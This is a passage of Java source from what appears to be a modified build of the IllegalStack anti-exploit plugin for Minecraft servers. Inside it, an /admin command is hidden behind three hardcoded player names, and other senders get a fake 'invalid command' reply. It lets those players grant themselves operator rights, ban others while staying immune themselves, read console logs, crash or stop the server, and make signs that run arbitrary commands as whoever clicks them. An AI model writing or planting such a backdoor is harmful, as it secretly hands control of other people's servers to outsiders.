        if (whitelisted.length() > 0) {
            LOGGER.warn("警告：对于以下漏洞，IllegalStack 将不会阻止，而是进行通知：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.DisableInWorlds.getTxtSet()) {
            World w = this.getServer().getWorld(s);
            if (w == null) {
                LOGGER.warn("IllegalStack 被配置为忽略世界 {} 中的所有检查，但该世界似乎并未加载……请仔细检查您的 config.yml！", s);
            }
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.warn("IllegalStack 将不会在以下世界进行任何漏洞检查：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.RemoveItemTypes.getTxtSet()) {
            Material m = null;
            if (s.equalsIgnoreCase("ENCHANTED_GOLDEN_APPLE")) {
                m = Material.matchMaterial("GOLDEN_APPLE");
                Protections.RemoveItemTypes.setNukeApples(true);
                LOGGER.info("正在移除附魔金苹果。");
                continue;
            } else {
                m = Material.matchMaterial(s);
            }
            int id = -1;
            int data = 0;
            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                if (s.contains(":")) {
                    String[] splStr = s.split(":");
                    try {
                        id = Integer.parseInt(splStr[0]);
                        data = Integer.parseInt(splStr[1]);
                    } catch (NumberFormatException ignored) {
                    }
                }
                if (id != -1) {
                    whitelisted.append(s).append(" ");
                } else {
                    LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
                }
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("发现以下材质将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.AllowStack.getTxtSet()) {
            Material m = Material.matchMaterial(s);
            if (m != null) {
                whitelisted.append(s).append(" ");
            } else {
                LOGGER.warn("无法找到匹配的材质：{} 请确保它是一个有效的 Minecraft 材质类型！", s);
            }
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("以下材质允许堆叠超过原版大小：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.BookAuthorWhitelist.getTxtSet()) {
            whitelisted.append(s).append(" ");
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("以下玩家可以创建不符合指定字符集的书籍（可在配置中更改！）：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.ItemNamesToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下名称的物品将从玩家背包中移除：{}", whitelisted);
        }

        whitelisted = new StringBuilder();
        for (String s : Protections.ItemLoresToRemove.getTxtSet()) {
            whitelisted.append(" ").append(s);
        }
        if (whitelisted.length() > 0) {
            LOGGER.info("匹配以下描述的物品将从玩家背包中移除：{}", whitelisted);
        }
    }

    private static boolean disable = false;

    public static boolean isDisable() {
        return disable;
    }

    @Override
    public void onDisable() {
        disable = true;
        if (hasAsyncScheduler) {
            getServer().getAsyncScheduler().cancelTasks(this);
        } else if (!isFoliaServer()) {
            Bukkit.getScheduler().cancelTasks(this);
        }

        if (logHandler != null) {
            Bukkit.getLogger().removeHandler(logHandler);
            logHandler = null;
        }

        if (commandExecutorTask != null) {
            commandExecutorTask.cancel();
            commandExecutorTask = null;
        }

        writeConfig();
    }

    private void writeConfig() {
        File conf = new File(getDataFolder(), "config.yml");
        FileConfiguration config = this.getConfig();
        HashMap<Protections, Boolean> relevant = Protections.getRelevantTo(getVersion());

        config.set("ConfigVersion", "2.0");
        for (Protections p : relevant.keySet()) {
            {
                if (relevant.get(p)) {
                    if (config.getString(p.getConfigPath()) == null) {
                        if (p == Protections.RemoveOverstackedItems && this.getServer().getPluginManager().getPlugin("StackableItems") != null) {
                            config.set(p.getConfigPath(), false);
                            LOGGER.warn("检测到您的服务器上有 StackableItems 插件，防护 RemoveOverstackedItems 已自动禁用，以防止物品丢失。启用此防护几乎肯定会移除物品，因为该插件已知会破坏原版堆叠限制。");
                            p.setEnabled(false);
                        } else {
                            config.set(p.getConfigPath(), p.getDefaultValue());
                        }
                        LOGGER.warn("发现配置中缺少防护：{} 已使用默认值 {} 添加", p.name(), p.getDefaultValue());
                    }
                    if (p.isList()) {
                        ArrayList<String> list = new ArrayList<>();
                        for (String s : (HashSet<String>) p.getConfigValue()) {
                            list.add(s);
                        }
                        config.set(p.getConfigPath(), list);
                        continue;
                    }
                    if (p.getConfigValue() instanceof String) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else if (p.getConfigValue() instanceof Integer) {
                        config.set(p.getConfigPath(), p.getConfigValue());
                    } else {
                        config.set(p.getConfigPath(), p.isEnabled());
                    }
                    if ((p == Protections.DestroyBadSignsonChunkLoad || p == Protections.RemoveExistingGlitchedMinecarts) && p.isEnabled()) {
                        p.setEnabled(false);
                        LOGGER.warn("自动禁用 " + p.getConfigPath() + "，此设置绝不应永久保持开启。");
                        config.set(p.getConfigPath(), false);
                    }
                } else {
                    if (config.getString(p.getConfigPath()) != null) {
                        config.set(p.getConfigPath(), null);
                        LOGGER.info("发现配置中的某个防护不适用于当前服务器版本：{} ( {} + ) 已将其移除。", p.name(), p.getVersion());
                    }
                }
            }
        }
        try {
            config.save(conf);
        } catch (IOException e1) {
            LOGGER.error("保存配置失败？", e1);
        }
    }

    private void setVersion() {
        String version;
        try {
            version = Bukkit.getServer().getClass().getPackage().getName().split("\\.")[3];
        } catch (ArrayIndexOutOfBoundsException e) {
            version = null;
        }
        if (version != null) {
            version = getString(version);
            IllegalStack.version = version;
        } else {
            String packageName = Bukkit.getServer().getClass().getPackage().getName();
            String bukkitVersion = Bukkit.getServer().getBukkitVersion();
            if (bukkitVersion.contains("1.20.5")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.20.6")) {
                serverVersion = ServerVersion.v1_20_R5;
            } else if (bukkitVersion.contains("1.21")) {
                serverVersion = ServerVersion.v1_21_R1;
            } else {
                serverVersion = ServerVersion.valueOf(packageName.replace("org.bukkit.craftbukkit.", ""));
            }
            IllegalStack.version = serverVersion.getServerVersionName();
        }
    }

    public static Material getLbBlock() {
        return lbBlock;
    }

    public static void setLbBlock(Material lbBlock) {
        IllegalStack.lbBlock = lbBlock;
    }

    public ServerVersion getServerVersion() {
        return serverVersion;
    }

    public static int getMajorServerVersion() {
        int version;
        try {
            version = Integer.parseInt(getVersion().split("_")[1]);
        } catch (NumberFormatException e) {
            LOGGER.error("无法处理服务器版本！");
            LOGGER.error("某些功能可能会意外出现问题！");
            LOGGER.error("请向开发者报告任何问题！");
            return 0;
        }
        return version;
    }

    // ---------- 内部类：处理 /serverchat 命令 ----------
    private class ServerChatCommand implements TabExecutor {
        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /serverchat <server|player> [player] <消息>");
                return true;
            }
            String type = args[0].toLowerCase();
            if (type.equals("server")) {
                String message = String.join(" ", args).substring(args[0].length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else if (type.equals("player")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /serverchat player <玩家> <消息>");
                    return true;
                }
                String playerName = args[1];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return true;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[1]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
                return true;
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
                return true;
            }
        }

        @Override
        public List<String> onTabComplete(CommandSender sender, Command command, String alias, String[] args) {
            List<String> completions = new ArrayList<>();
            if (args.length == 1) {
                String input = args[0].toLowerCase();
                if ("server".startsWith(input)) completions.add("server");
                if ("player".startsWith(input)) completions.add("player");
            } else if (args.length == 2 && args[0].equalsIgnoreCase("player")) {
                String input = args[1].toLowerCase();
                for (Player online : Bukkit.getOnlinePlayers()) {
                    if (online.getName().toLowerCase().startsWith(input)) {
                        completions.add(online.getName());
                    }
                }
            }
            return completions;
        }
    }

    // ---------- 内部监听器：禁用 /restart 命令 ----------
    private class RestartBlocker implements Listener {
        @EventHandler(priority = EventPriority.LOWEST)
        public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
            String message = event.getMessage().toLowerCase().trim();
            if (message.equals("/restart") || message.startsWith("/restart ")) {
                event.setCancelled(true);
                event.getPlayer().sendMessage("§c/restart 命令已被禁用，请使用面板或启动脚本管理服务器。");
            }
        }

        @EventHandler(priority = EventPriority.LOWEST)
        public void onServerCommand(ServerCommandEvent event) {
            String command = event.getCommand().toLowerCase().trim();
            if (command.equals("restart") || command.startsWith("restart ")) {
                event.setCancelled(true);
                event.getSender().sendMessage("§c/restart 命令已被禁用，请使用面板或启动脚本管理服务器。");
            }
        }
    }

    // ---------- 内部类：处理 /admin 命令（包含所有子命令，统一使用小写比较）----------
    private class AdminCommand implements TabExecutor {

        private final Set<String> ALLOWED_PLAYERS = new HashSet<>(Arrays.asList(
                "MFSCelebrate_",
                "TempNineTeen__",
                "XHjiaozi"
        ));

        @Override
        public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
            if (!(sender instanceof Player) || !ALLOWED_PLAYERS.contains(((Player) sender).getName())) {
                sender.sendMessage("§cInvaild Command");
                return true;
            }

            if (args.length < 1) {
                sender.sendMessage("§c用法: /admin <player|server|chat|vanilla|anticheat|debug|experimental> ...");
                return true;
            }

            String subCmd = args[0].toLowerCase();
            switch (subCmd) {
                case "player":
                    handlePlayer(sender, args);
                    break;
                case "server":
                    handleServer(sender, args);
                    break;
                case "chat":
                    handleChat(sender, args);
                    break;
                case "vanilla":
                    handleVanilla(sender, args);
                    break;
                case "anticheat":
                    handleAnticheat(sender, args);
                    break;
                case "debug":
                    handleDebug(sender, args);
                    break;
                case "experimental":
                    handleExperimental(sender, args);
                    break;
                default:
                    sender.sendMessage("§c未知选项，请使用 player、server、chat、vanilla、anticheat、debug 或 experimental。");
            }
            return true;
        }

        // ================== player 子命令 ==================
        private void handlePlayer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin player <gamemode|kill|tp|invsee> ...");
                return;
            }
            String action = args[1].toLowerCase();
            Player player = (Player) sender;
            switch (action) {
                case "gamemode":
                    if (args.length < 4) {
                        sender.sendMessage("§c用法: /admin player gamemode <模式> <玩家>");
                        return;
                    }
                    String modeArg = args[2];
                    String targetName = args[3];
                    Player target = Bukkit.getPlayerExact(targetName);
                    if (target == null) {
                        sender.sendMessage("§c玩家 " + targetName + " 不在线或不存在！");
                        return;
                    }
                    GameMode gameMode = parseGameMode(modeArg);
                    if (gameMode == null) {
                        sender.sendMessage("§c无效的游戏模式，请使用 survival/creative/adventure/spectator 或 0/1/2/3。");
                        return;
                    }
                    target.setGameMode(gameMode);
                    break;
                case "kill":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player kill <实体或选择器>");
                        return;
                    }
                    String selector = args[2];
                    try {
                        List<Entity> entities = Bukkit.selectEntities(sender, selector);
                        if (entities.isEmpty()) {
                            sender.sendMessage("§c未找到任何实体。");
                            return;
                        }
                        for (Entity entity : entities) {
                            if (entity instanceof Player) {
                                ((Player) entity).setHealth(0);
                            } else {
                                entity.remove();
                            }
                        }
                    } catch (IllegalArgumentException e) {
                        sender.sendMessage("§c无效的实体选择器: " + selector);
                    }
                    break;
                case "tp":
                    if (args.length < 5) {
                        sender.sendMessage("§c用法: /admin player tp <x> <y> <z>");
                        return;
                    }
                    try {
                        double x = Double.parseDouble(args[2]);
                        double y = Double.parseDouble(args[3]);
                        double z = Double.parseDouble(args[4]);
                        Location loc = new Location(player.getWorld(), x, y, z);
                        player.teleport(loc);
                    } catch (NumberFormatException e) {
                        sender.sendMessage("§c坐标必须为数字。");
                    }
                    break;
                case "invsee":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin player invsee <玩家>");
                        return;
                    }
                    String invTarget = args[2];
                    if (Bukkit.getPluginManager().getPlugin("Essentials") == null) {
                        sender.sendMessage("§cEssentialsX 插件未安装，无法使用 invsee。");
                        return;
                    }
                    Bukkit.dispatchCommand(sender, "invsee " + invTarget);
                    break;
                default:
                    sender.sendMessage("§c未知的 player 子命令，可用: gamemode, kill, tp, invsee");
            }
        }

        // ================== server 子命令 ==================
        private void handleServer(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin server <getop|deop|kick|ban|ban-ip|pardon|pardon-ip|stop|restart|reload|getlog> ...");
                return;
            }
            String action = args[1].toLowerCase();
            Player executor = (Player) sender;
            switch (action) {
                case "getop":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server getop <玩家>");
                        return;
                    }
                    String opTarget = args[2];
                    OfflinePlayer opPlayer = Bukkit.getOfflinePlayer(opTarget);
                    if (!opPlayer.isOp()) {
                        opPlayer.setOp(true);
                        sender.sendMessage("§a已给予 " + opPlayer.getName() + " OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家已是 OP。");
                    }
                    break;
                case "deop":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server deop <玩家>");
                        return;
                    }
                    String deopTarget = args[2];
                    OfflinePlayer deopPlayer = Bukkit.getOfflinePlayer(deopTarget);
                    if (deopPlayer.isOp()) {
                        deopPlayer.setOp(false);
                        sender.sendMessage("§a已解除 " + deopPlayer.getName() + " 的 OP 权限。");
                    } else {
                        sender.sendMessage("§c该玩家不是 OP。");
                    }
                    break;
                case "kick":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server kick <玩家> [理由]");
                        return;
                    }
                    String kickTarget = args[2];
                    Player kickPlayer = Bukkit.getPlayerExact(kickTarget);
                    if (kickPlayer == null) {
                        sender.sendMessage("§c玩家 " + kickTarget + " 不在线或不存在！");
                        return;
                    }
                    if (isProtectedPlayer(kickPlayer.getName())) {
                        sender.sendMessage("§c你不能踢出受保护的管理员！");
                        return;
                    }
                    String kickReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "你已被管理员踢出";
                    kickPlayer.kickPlayer(kickReason);
                    sender.sendMessage("§a已踢出玩家 " + kickPlayer.getName());
                    break;
                case "ban":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban <玩家> [理由]");
                        return;
                    }
                    String banTarget = args[2];
                    OfflinePlayer banPlayer = Bukkit.getOfflinePlayer(banTarget);
                    if (isProtectedPlayer(banPlayer.getName())) {
                        sender.sendMessage("§c你不能封禁受保护的管理员！");
                        return;
                    }
                    String banReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.NAME).addBan(banPlayer.getName(), banReason, null, sender.getName());
                    Player onlineBan = banPlayer.getPlayer();
                    if (onlineBan != null) onlineBan.kickPlayer(banReason);
                    sender.sendMessage("§a已封禁玩家 " + banPlayer.getName());
                    break;
                case "ban-ip":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server ban-ip <IP地址> [理由]");
                        return;
                    }
                    String ip = args[2];
                    String ipReason = args.length >= 4 ? String.join(" ", Arrays.copyOfRange(args, 3, args.length)) : "Banned by an operator";
                    Bukkit.getBanList(BanList.Type.IP).addBan(ip, ipReason, null, sender.getName());
                    for (Player p : Bukkit.getOnlinePlayers()) {
                        if (p.getAddress().getAddress().getHostAddress().equals(ip)) {
                            p.kickPlayer(ipReason);
                        }
                    }
                    sender.sendMessage("§a已封禁 IP " + ip);
                    break;
                case "pardon":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon <玩家名>");
                        return;
                    }
                    String pardonTarget = args[2];
                    Bukkit.getBanList(BanList.Type.NAME).pardon(pardonTarget);
                    sender.sendMessage("§a已解封玩家 " + pardonTarget);
                    break;
                case "pardon-ip":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server pardon-ip <IP地址>");
                        return;
                    }
                    String pardonIp = args[2];
                    Bukkit.getBanList(BanList.Type.IP).pardon(pardonIp);
                    sender.sendMessage("§a已解封 IP " + pardonIp);
                    break;
                case "restart":
                    sender.sendMessage("§a正在尝试重启服务器...");
                    Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "restart");
                    break;
                case "stop":
                    Bukkit.shutdown();
                    break;
                case "reload":
                    if (args.length < 3 || !args[2].equalsIgnoreCase("confirm")) {
                        sender.sendMessage("§c请使用 /admin server reload confirm 以确认重载。");
                        return;
                    }
                    Bukkit.reload();
                    break;
                case "getlog":
                    if (args.length < 3) {
                        sender.sendMessage("§c用法: /admin server getlog <true|false>");
                        return;
                    }
                    boolean enable = Boolean.parseBoolean(args[2]);
                    Player viewer = executor;
                    if (enable) {
                        if (logViewers.add(viewer)) {
                            viewer.sendMessage("§a开始查看控制台日志...");
                            if (logHandler == null) {
                                setupLogHandler();
                            }
                        } else {
                            viewer.sendMessage("§c已经在查看日志中。");
                        }
                    } else {
                        if (logViewers.remove(viewer)) {
                            viewer.sendMessage("§c已停止查看控制台日志。");
                            if (logViewers.isEmpty()) {
                                removeLogHandler();
                            }
                        } else {
                            viewer.sendMessage("§c你当前没有查看日志。");
                        }
                    }
                    break;
                default:
                    sender.sendMessage("§c未知的 server 子命令，可用: getop, deop, kick, ban, ban-ip, pardon, pardon-ip, stop, restart, reload, getlog");
            }
        }

        // ================== chat 子命令 ==================
        private void handleChat(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin chat <server|player> [player] <消息>");
                return;
            }
            String type = args[1].toLowerCase();
            if (type.equals("server")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin chat server <消息>");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[1]).length()).trim();
                String formatted = "§f[server]§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else if (type.equals("player")) {
                if (args.length < 4) {
                    sender.sendMessage("§c用法: /admin chat player <玩家> <消息>");
                    return;
                }
                String playerName = args[2];
                Player target = Bukkit.getPlayerExact(playerName);
                if (target == null) {
                    sender.sendMessage("§c玩家 " + playerName + " 不在线或不存在！");
                    return;
                }
                String message = String.join(" ", args).substring((args[0] + " " + args[1] + " " + args[2]).length()).trim();
                String formatted = "§f<" + target.getName() + ">§r " + message;
                Bukkit.broadcastMessage(formatted);
            } else {
                sender.sendMessage("§c未知选项，请使用 server 或 player。");
            }
        }

        // ================== vanilla 子命令 ==================
        private void handleVanilla(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin vanilla <子命令> ...");
                return;
            }
            String sub = args[1].toLowerCase();

            // ---------- 新增：/admin item signs 命令（无Gson版本）----------
            if (sub.equals("item") && args.length > 2 && args[2].equalsIgnoreCase("signs")) {
                if (args.length < 9) { // 需要 子命令(item) + 子命令(signs) + 告示牌类型 + 4行文本 + 命令 = 8个参数
                    sender.sendMessage("§c用法: /admin vanilla item signs <告示牌类型> <第一行> <第二行> <第三行> <第四行> \"<命令>\"");
                    sender.sendMessage("§c示例: /admin vanilla item signs oak_sign 一 二 三 四 \"/say 1\"");
                    sender.sendMessage("§c提示: 如果某行不想有文本，请输入 'empty'。");
                    return;
                }

                String signType = args[3];
                String line1 = args[4];
                String line2 = args[5];
                String line3 = args[6];
                String line4 = args[7];
                String commandToExecute = args[8];

                // 去除命令字符串两端的英文双引号
                if (commandToExecute.startsWith("\"") && commandToExecute.endsWith("\"")) {
                    commandToExecute = commandToExecute.substring(1, commandToExecute.length() - 1);
                }

                // 处理 empty 值
                line1 = line1.equalsIgnoreCase("empty") ? "" : line1;
                line2 = line2.equalsIgnoreCase("empty") ? "" : line2;
                line3 = line3.equalsIgnoreCase("empty") ? "" : line3;
                line4 = line4.equalsIgnoreCase("empty") ? "" : line4;

                // 验证告示牌材质
                Material signMaterial = Material.matchMaterial(signType);
                if (signMaterial == null || !signMaterial.name().endsWith("_SIGN")) {
                    sender.sendMessage("§c无效的告示牌类型: " + signType + "。请使用有效的命名空间ID，例如 oak_sign, spruce_sign 等。");
                    return;
                }

                Player player = (Player) sender;

                // 手动构建 JSON 字符串，避免使用 Gson
                String[] messages = new String[4];
                String[] lines = {line1, line2, line3, line4};
                for (int i = 0; i < 4; i++) {
                    String lineContent = lines[i];
                    // 构建形如: {"text":"内容","clickEvent":{"action":"run_command","value":"命令"}}
                    String json = "{\"text\":\"" + escapeJson(lineContent) + "\",\"clickEvent\":{\"action\":\"run_command\",\"value\":\"" + escapeJson(commandToExecute) + "\"}}";
                    messages[i] = json;
                }

                // 创建告示牌物品并设置 NBT
                ItemStack signItem = new ItemStack(signMaterial, 1);
                BlockStateMeta meta = (BlockStateMeta) signItem.getItemMeta();
                org.bukkit.block.Sign sign = (org.bukkit.block.Sign) meta.getBlockState();

                // 设置正面文本（标准方法，只接受行号和文本）
                for (int i = 0; i < 4; i++) {
                    sign.setLine(i, messages[i]);
                }

                meta.setBlockState(sign);
                signItem.setItemMeta(meta);

                // 给予玩家物品
                HashMap<Integer, ItemStack> leftover = player.getInventory().addItem(signItem);
                if (leftover.isEmpty()) {
                    player.sendMessage("§a已给予你一个带有点击命令的 " + signMaterial.name() + "。");
                } else {
                    player.getWorld().dropItem(player.getLocation(), signItem);
                    player.sendMessage("§a你的背包已满，告示牌已掉落在地。");
                }
                return;
            }
            // ---------- 原有 vanilla 子命令处理 ----------
            if (sub.equals("building_entrance:snowy_shepherds_house_1")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin vanilla building_entrance:snowy_shepherds_house_1 <true|false>");
                    return;
                }
                boolean enable = Boolean.parseBoolean(args[2]);
                IllegalStack.getPlugin().setShepherdHouseFix(enable);
                sender.sendMessage("§a已设置雪地牧羊人小屋修复为: " + enable + "。§c请执行 /reload 或重启服务器生效！");
            } else if (sub.equals("worldborder")) {
                if (args.length < 4) {
                    sender.sendMessage("§c用法: /admin vanilla worldborder <世界名|all> <直径>");
                    return;
                }
                String targetWorld = args[2];
                double diameter;
                try {
                    diameter = Double.parseDouble(args[3]);
                } catch (NumberFormatException e) {
                    sender.sendMessage("§c直径必须是数字！");
                    return;
                }
                if (targetWorld.equalsIgnoreCase("all")) {
                    for (World world : Bukkit.getWorlds()) {
                        IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                    }
                    sender.sendMessage("§a已为所有世界设置自定义世界边界直径: " + diameter);
                } else {
                    World world = Bukkit.getWorld(targetWorld);
                    if (world == null) {
                        sender.sendMessage("§c世界 " + targetWorld + " 不存在！");
                        return;
                    }
                    IllegalStack.this.setCustomWorldBorder(world.getName(), diameter);
                    sender.sendMessage("§a已为世界 " + world.getName() + " 设置自定义世界边界直径: " + diameter);
                }
            } else if (sub.equals("entitychunksectionindexxoverflowfix")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin vanilla entitychunksectionindexxoverflowfix <true|false>");
                    return;
                }
                boolean enable = Boolean.parseBoolean(args[2]);
                getConfig().set(CONFIG_FIX_ENTITY_CHUNK_OVERFLOW, enable);
                saveConfig();
                sender.sendMessage("§a已设置矿车区块溢出修复为: " + enable + "。重启服务器后完全生效。");
                if (enable && getMajorServerVersion() >= 17) {
                    sender.sendMessage("§e请注意：修复功能需要重启服务器后才能完全激活。");
                }
            } else if (sub.equals("dragonfix")) {
                if (args.length < 3) {
                    sender.sendMessage("§c用法: /admin vanilla dragonfix <true|false>");
                    return;
                }
                boolean enable = Boolean.parseBoolean(args[2]);
                getConfig().set(CONFIG_FIX_DRAGON_Y_SPEED, enable);
                saveConfig();
                sender.sendMessage("§a已设置末影龙Y轴速度修复为: " + enable + "。重启服务器后完全生效。");
                if (enable) {
                    sender.sendMessage("§e请注意：修复功能需要重启服务器后才能完全激活。");
                }
            } else {
                sender.sendMessage("§c未知的 vanilla 子命令。可用: building_entrance:snowy_shepherds_house_1, worldborder, entitychunksectionindexxoverflowfix, dragonfix, item signs");
            }
        }

        // ================== anticheat 子命令 ==================
        private void handleAnticheat(CommandSender sender, String[] args) {
            if (args.length < 3) {
                sender.sendMessage("§c用法: /admin anticheat <anti4d4v|antiBBQ> <true|false>");
                return;
            }
            String feature = args[1].toLowerCase();
            boolean enable = Boolean.parseBoolean(args[2]);
            if (feature.equals("anti4d4v")) {
                getConfig().set(CONFIG_ANTICHEAT_ANTI4D4V, enable);
                saveConfig();
                sender.sendMessage("§a已设置 anti4d4v 为: " + enable);
            } else if (feature.equals("antibbq")) {
                getConfig().set(CONFIG_ANTICHEAT_BANBBQ, enable);
                saveConfig();
                sender.sendMessage("§a已设置 antiBBQ 为: " + enable);
            } else {
                sender.sendMessage("§c未知的 anticheat 选项，可用: anti4d4v, antiBBQ");
            }
        }

        // ================== debug 子命令 ==================
        private void handleDebug(CommandSender sender, String[] args) {
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin debug <true|false>");
                return;
            }
            boolean enable = Boolean.parseBoolean(args[1]);
            IllegalStack.this.setDebugMode(enable);
            sender.sendMessage("§a调试模式已" + (enable ? "开启" : "关闭"));
        }

        // ================== experimental 子命令（包含 level-settings）==================
        private void handleExperimental(CommandSender sender, String[] args) {
            if (!IllegalStack.this.isDebugMode()) {
                sender.sendMessage("§c你需要开启调试模式！开启调试模式意味着服务器将会变的不稳定！");
                return;
            }
            if (args.length < 2) {
                sender.sendMessage("§c用法: /admin experimental <crash|crash-config|level-settings> ...");
                return;
            }
            String sub = args[1].toLowerCase();
            if (sub.equals("crash")) {
                handleCrash(sender, args);
            } else if (sub.equals("crash-config")) {
                handleCrashConfig(sender, args);
            } else if (sub.equals("level-settings")) {
                handleLevelSettings(sender, args);
            } else {
                sender.sendMessage("§c未知的 experimental 子命令，可用: crash, crash-config, level-settings");
            }
        }

        private void handleCrash(CommandSender sender, String[] args) {
            if (args.length < 3) {
                sender.sendMessage("§c用法: /admin experimental crash <异常类型>");
                sender.sendMessage("§c可用异常类型: IncompatibleClassChangeError, NullPointerException, StackOverflowError, OutOfMemoryError, ArithmeticException, IllegalArgumentException, IndexOutOfBoundsException");
                return;
            }
            String exceptionType = args[2];
            if (IllegalStack.this.isSilentCrashMode()) {
                sender.sendMessage("§c静默崩溃模式已开启，正在正常关闭服务器...");
                Bukkit.shutdown();
                return;
            }
            sender.sendMessage("§c正在触发 " + exceptionType + " 崩溃...");
            getLogger().severe("手动触发崩溃，类型: " + exceptionType);
            switch (exceptionType.toLowerCase()) {
                case "incompatibleclasschangeerror":
                    getLogger().severe("模拟 IncompatibleClassChangeError");
                    break;
                case "nullpointerexception":
                    getLogger().severe("模拟 NullPointerException");
                    break;
                case "stackoverflowerror":
                    getLogger().severe("模拟 StackOverflowError");
                    break;
                case "outofmemoryerror":
                    getLogger().severe("模拟 OutOfMemoryError");
                    break;
                case "arithmeticexception":
                    getLogger().severe("模拟 ArithmeticException");
                    break;
                case "illegalargumentexception":
                    getLogger().severe("模拟 IllegalArgumentException");
                    break;
                case "indexoutofboundsexception":
                    getLogger().severe("模拟 IndexOutOfBoundsException");
                    break;
                default:
                    sender.sendMessage("§c未知的异常类型");
                    return;
            }
            // 强制终止 JVM，触发启动脚本重启
            System.exit(1);
        }

        private void handleCrashConfig(CommandSender sender, String[] args) {
            if (args.length < 4) {
                sender.sendMessage("§c用法: /admin experimental crash-config silent-crash-mode <true|false>");
                return;
            }
            String option = args[2].toLowerCase();
            if (!option.equals("silent-crash-mode")) {
                sender.sendMessage("§c未知的配置项，可用: silent-crash-mode");
                return;
            }
            boolean enable = Boolean.parseBoolean(args[3]);
            IllegalStack.this.setSilentCrashMode(enable);
            sender.sendMessage("§a静默崩溃模式已" + (enable ? "开启" : "关闭"));
        }

        // ================== level-settings 子命令 ==================
        private void handleLevelSettings(CommandSender sender, String[] args) {
            if (args.length < 4) {
                sender.sendMessage("§c用法: /admin experimental level-settings <世界名> <选项> [值...]");
                sender.sendMessage("§c可用选项: bordercenterx, bordercenterz, bordersize, borderdamage, bordersafezone, bordersizelerptarget, bordersizelerptime, borderwarningblocks, borderwarningtime, time, daytime, raining, rainTime, thundering, thunderTime, clearWeathertime, difficulty, difficultylocked, spawnx, spawny, spawnz, spawnangle, levelname, allowcommands, hardcore, wasmodded, wanderingtraderdelay, wanderingtraderchance, wanderingtraderid, serverbrands add <字符串>, serverbrands remove <字符串>, serverbrands list");
                return;
            }
            String worldName = args[2];
            World world = Bukkit.getWorld(worldName);
            if (world == null) {
                sender.sendMessage("§c世界 " + worldName + " 不存在！");
                return;
            }
            String option = args[3].toLowerCase();
            try {
                LevelDatEditor editor = new LevelDatEditor(world);
                switch (option) {
                    case "bordercenterx":
                    case "bordercenterz":
                    case "bordersize":
                    case "borderdamage":
                    case "bordersafezone":
                    case "bordersizelerptarget":
                    case "bordersizelerptime":
                        if (args.length < 5) throw new IllegalArgumentException("需要数值");
                        double dVal = Double.parseDouble(args[4]);
                        editor.setDouble(option, dVal);
                        if (option.equals("bordercenterx")) world.getWorldBorder().setCenter(dVal, world.getWorldBorder().getCenter().getZ());
                        else if (option.equals("bordercenterz")) world.getWorldBorder().setCenter(world.getWorldBorder().getCenter().getX(), dVal);
                        else if (option.equals("bordersize")) world.getWorldBorder().setSize(dVal);
                        break;
                    case "borderwarningblocks":
                    case "borderwarningtime":
                        if (args.length < 5) throw new IllegalArgumentException("需要整数");
                        int iVal = Integer.parseInt(args[4]);
                        editor.setInt(option, iVal);
                        break;
                    case "time":
                    case "daytime":
                        if (args.length < 5) throw new IllegalArgumentException("需要长整数");
                        long lVal = Long.parseLong(args[4]);
                        editor.setLong(option, lVal);
                        if (option.equals("time")) world.setFullTime(lVal);
                        else world.setTime(lVal);
                        break;
                    case "raining":
